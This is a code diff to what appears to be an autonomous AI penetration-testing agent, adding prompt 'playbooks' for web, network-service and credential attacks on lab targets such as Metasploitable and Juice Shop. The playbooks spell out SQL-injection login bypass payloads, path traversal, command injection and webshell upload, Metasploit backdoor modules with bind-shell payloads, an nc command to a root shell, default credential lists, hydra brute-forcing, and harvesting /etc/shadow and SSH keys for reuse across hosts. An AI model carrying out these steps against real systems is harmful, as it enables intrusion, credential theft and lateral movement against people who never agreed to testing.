@@ -27,6 +27,43 @@ _WEB_HINT_RE = re.compile(
     re.IGNORECASE,
 )
 
+# Classic remotely-exploitable / backdoored network services (Metasploitable-class).
+# Deliberately EXCLUDES 22/80/443: bare SSH is a cred/brute target, and web ports are
+# the web playbook's domain — this playbook is about service-side RCE.
+NET_EXPLOIT_PORTS = {
+    "21", "23", "25", "111", "139", "445", "512", "513", "514", "1099", "1524",
+    "2049", "2121", "3306", "3632", "5432", "5900", "6000", "6200", "6667",
+    "8009", "8180",
+}
+
+_NET_HINT_RE = re.compile(
+    r"\b(metasploitable|metasploit|msf|samba|smb|vsftpd|unreal[-\s]?ircd|distcc|"
+    r"ingreslock|backdoor|bind[-\s]?shell|reverse[-\s]?shell|command[-\s]execution|"
+    r"remote[-\s]code|rce|root[-\s]shell|get[-\s]a[-\s]shell)\b",
+    re.IGNORECASE,
+)
+
+# Authenticated services where weak/default/reused creds are a foothold.
+CRED_SERVICE_PORTS = {
+    "21", "22", "23", "25", "110", "143", "139", "445", "1433", "2121",
+    "3306", "3389", "5432", "5900", "8180",
+}
+
+_CRED_HINT_RE = re.compile(
+    r"\b(passwords?|passwd|brute[-\s]?forc\w*|credentials?|default[-\s]cred\w*|"
+    r"weak[-\s]passwords?|spray\w*|hydra|medusa|log[-\s]?in|crack\w*|ssh[-\s]keys?|"
+    r"reuse\w*|/etc/shadow|kerberoast\w*)\b",
+    re.IGNORECASE,
+)
+
+
+def _bare_ports(state: Any) -> set[str]:
+    """Port numbers from AttackState.open_ports, tolerating '445' or '445/tcp'."""
+    try:
+        return {str(p).split("/")[0] for p in (getattr(state, "open_ports", None) or [])}
+    except Exception:
+        return set()
+
 
 @dataclass(frozen=True)
 class Skill:
@@ -56,25 +93,131 @@ WEB_ATTACK_SKILL = Skill(
     name="web_app_attacks",
     matches=_is_web_target,
     body=(
-        "ACTIVE PLAYBOOK — the target is a web application. Follow this NOW, in "
-        "order; it overrides your default recon-first workflow:\n"
-        "1. Do NOT call cve_lookup or web_search — a modern web app has no useful "
-        "CVE/search results. Skip straight to interacting with the app.\n"
-        "2. Your next action MUST be an `http_request` (NOT shell curl — it sends "
-        "structured JSON so injection payloads with quotes survive intact). The "
-        "attack surface is the REST API, not the static HTML.\n"
-        "3. To log in as another user without the password, POST the login "
-        "endpoint with a SQL-injection auth bypass — json_body "
-        '{"email": "\' OR 1=1--", "password": "anything"}. Try these endpoints in '
-        "order: /rest/user/login, /api/login, /login.\n"
-        "4. Success = the response contains an authentication token for the admin "
-        "user (admin@juice-sh.op). That token is your proof."
+        "ACTIVE PLAYBOOK — the target is a web application. This overrides recon-"
+        "first: interact with the app directly.\n"
+        "TOOLING: use `http_request` (structured JSON — payloads with quotes survive "
+        "intact), NOT shell curl. The real attack surface is the REST API + request "
+        "parameters, not the static HTML. Do NOT call cve_lookup/web_search on a "
+        "modern web app — there are no useful results.\n"
+        "PICK THE TECHNIQUE BY OBJECTIVE (don't fixate — if a class comes back clean, "
+        "move to the next):\n"
+        "- AUTH BYPASS / log in as someone else → SQL injection on the login POST: "
+        'json_body {"email": "\' OR 1=1--", "password": "anything"} at, in order, '
+        "/rest/user/login, /api/login, /login. Success = an auth token for the admin "
+        "(e.g. admin@juice-sh.op).\n"
+        "- BROKEN ACCESS CONTROL / IDOR → request another user's/object's resource "
+        "directly: change the id in /api/<obj>/<id> or /rest/basket/<id>, hit admin-"
+        "only endpoints directly, or forge/swap the JWT / Authorization bearer.\n"
+        "- READ A FILE / CONFIDENTIAL DOC → path traversal. GET static paths like "
+        "/ftp/<file>; traverse with ../ (URL-encode as %2e%2e%2f). Bypass an "
+        "extension filter with a poison null byte %2500 (e.g. "
+        "/ftp/package.json.bak%2500.md). Juice Shop's confidential file is "
+        "/ftp/acquisitions.md.\n"
+        "- RCE / LFI VIA A PARAMETER → test injectable params with command injection "
+        "(`; id`, `| id`, `$(id)`), path traversal (../../etc/passwd), and SSTI "
+        "({{7*7}} or ${7*7} — a returned 49 confirms).\n"
+        "- FILE UPLOAD → upload something the server executes or parses (XML→XXE, or "
+        "a webshell when extension filters are weak).\n"
+        "- SEARCH / QUERY PARAMS → SQLi or NoSQLi in q=, filter=, orderBy=.\n"
+        "PROOF = the objective's actual evidence (an admin token, the file's "
+        "contents, the flag) returned by a request YOU issued — never a payload you "
+        "did not send."
     ),
 )
 
-# The active skill set. Kept tiny on purpose — this is the prototype web skill;
-# more skills (LFI, SSTI, auth, cloud, AD) slot in here the same way.
-SKILLS: list[Skill] = [WEB_ATTACK_SKILL]
+def _is_network_target(state: Any, user_input: str) -> bool:
+    """A service-side exploitation target is in play if a classic exploitable
+    non-web service port is open, or the request talks about network RCE / named
+    Metasploitable services."""
+    if _bare_ports(state) & NET_EXPLOIT_PORTS:
+        return True
+    return bool(_NET_HINT_RE.search(user_input or ""))
+
+
+NETWORK_ATTACK_SKILL = Skill(
+    name="network_service_exploits",
+    matches=_is_network_target,
+    body=(
+        "ACTIVE PLAYBOOK — the target exposes classic exploitable network services "
+        "(Metasploitable-class). Follow this NOW; it overrides recon-first stalling.\n"
+        "CONTAINMENT RULE (critical): this is an isolated lab with NO route back to "
+        "you. A REVERSE shell can never connect out, so NEVER use a reverse/"
+        "meterpreter payload. If a module auto-selects one and demands LHOST, that is "
+        "the WRONG payload — switch to a BIND payload (or a direct connect). Do NOT "
+        "ask the operator for an LHOST; it does not exist here.\n"
+        "1. FASTEST WIN FIRST — some ports are ALREADY a shell, no exploit needed. If "
+        "1524 (ingreslock) is open it is an open ROOT shell: your next action should "
+        "be `shell` with `(echo id; echo cat <PROOF_FILE>) | nc <target> 1524`. This "
+        "is usually the single fastest capture — try it before anything fancier.\n"
+        "2. For Metasploit you are in stateless CLI mode: sessions do NOT persist "
+        "between calls, so msf_run MUST carry a BIND payload AND a post_cmd in the "
+        "SAME call. Reliable no-LHOST vectors (pick by open port):\n"
+        "   - SMB 139/445 → msf_run(module='exploit/multi/samba/usermap_script', "
+        "payload='cmd/unix/bind_netcat', post_cmd='cat <PROOF_FILE>'). Very reliable.\n"
+        "   - IRC 6667 → module='exploit/unix/irc/unreal_ircd_3281_backdoor', "
+        "payload='cmd/unix/bind_perl', post_cmd='cat <PROOF_FILE>'.\n"
+        "   - distcc 3632 → module='exploit/unix/misc/distcc_exec', "
+        "payload='cmd/unix/bind_ruby', post_cmd='cat <PROOF_FILE>'.\n"
+        "   - FTP 21 vsftpd 2.3.4 → module='exploit/unix/ftp/vsftpd_234_backdoor'. "
+        "NOTE: on current Metasploit its 'cmd/unix/interact' payload is GONE — if "
+        "PAYLOAD is rejected, do NOT retry it; move to another vector above.\n"
+        "3. DON'T FIXATE. If a module errors twice (invalid payload / failed option "
+        "validation), PIVOT to a different service/module — fixating on one broken "
+        "vector is the failure mode. The 1524 shell and the samba path are your "
+        "highest-confidence fallbacks.\n"
+        "4. PROOF = the exact contents of the file you were told to read. Actually "
+        "run the read in a shell/session and return the FLAG{...} verbatim — do NOT "
+        "answer with a command you did not execute."
+    ),
+)
+
+def _is_credential_target(state: Any, user_input: str) -> bool:
+    """A credential attack is in play if an authenticated service is exposed, or
+    the request talks about passwords / brute-force / default creds / login."""
+    if _bare_ports(state) & CRED_SERVICE_PORTS:
+        return True
+    return bool(_CRED_HINT_RE.search(user_input or ""))
+
+
+CREDENTIAL_ATTACK_SKILL = Skill(
+    name="credential_attacks",
+    matches=_is_credential_target,
+    body=(
+        "ACTIVE PLAYBOOK — the target exposes authenticated services, so weak, "
+        "default, or reused credentials are often the FASTEST foothold. Follow this "
+        "NOW. Only the operator's named target is in scope — never spray other hosts.\n"
+        "1. DEFAULT / KNOWN CREDS FIRST — try these before ANY brute-force; on "
+        "Metasploitable-class boxes they usually just work: msfadmin:msfadmin, "
+        "user:user, service:service, postgres:postgres, root:(blank), "
+        "tomcat:tomcat and tomcat:s3cret (Tomcat manager on 8180), mysql root:(blank).\n"
+        "2. Your attacker box has NO ssh/ftp/mysql CLIENT installed — do NOT shell out "
+        "to `ssh`/`ftp`. Use Metasploit's login scanners via msf_run (stateless CLI "
+        "mode: found creds print to the output, and a successful ssh_login also opens "
+        "a session):\n"
+        "   - SSH 22 → msf_run(module='auxiliary/scanner/ssh/ssh_login', "
+        "options='{\"USERNAME\":\"msfadmin\",\"PASSWORD\":\"msfadmin\"}', "
+        "post_cmd='cat <PROOF_FILE>')\n"
+        "   - SMB 445 → auxiliary/scanner/smb/smb_login (SMBUser/SMBPass or "
+        "USER_FILE/PASS_FILE)\n"
+        "   - MySQL 3306 → auxiliary/scanner/mysql/mysql_login  |  Postgres 5432 → "
+        "auxiliary/scanner/postgres/postgres_login  |  FTP 21 → "
+        "auxiliary/scanner/ftp/ftp_login\n"
+        "   For a spray, set USER_FILE/PASS_FILE to a SMALL list (echo a few common "
+        "creds to a file); keep lists tiny in a lab. Or `kali_run`/`shell` hydra: "
+        "`hydra -l <user> -P <list> <target> ssh`.\n"
+        "3. FOOTHOLD = authenticate with the creds you found. A successful ssh_login "
+        "opens a session — pass post_cmd='cat <PROOF_FILE>' to read the proof in the "
+        "SAME call (CLI sessions do not persist between calls).\n"
+        "4. POST-EX LOOT → LATERAL: once in, harvest /etc/shadow, DB creds, and SSH "
+        "keys, and REUSE found passwords across other services/hosts.\n"
+        "5. PROOF = actually authenticate and read the file's contents; return the "
+        "FLAG{...} verbatim. Never answer with a credential you did not validate."
+    ),
+)
+
+# The active skill set. Kept tiny on purpose; more skills (LFI, SSTI, cloud, AD)
+# slot in here the same way.
+SKILLS: list[Skill] = [WEB_ATTACK_SKILL, NETWORK_ATTACK_SKILL, CREDENTIAL_ATTACK_SKILL]
 
 
 def relevant_skills(state: Any, user_input: str = "") -> list[str]:
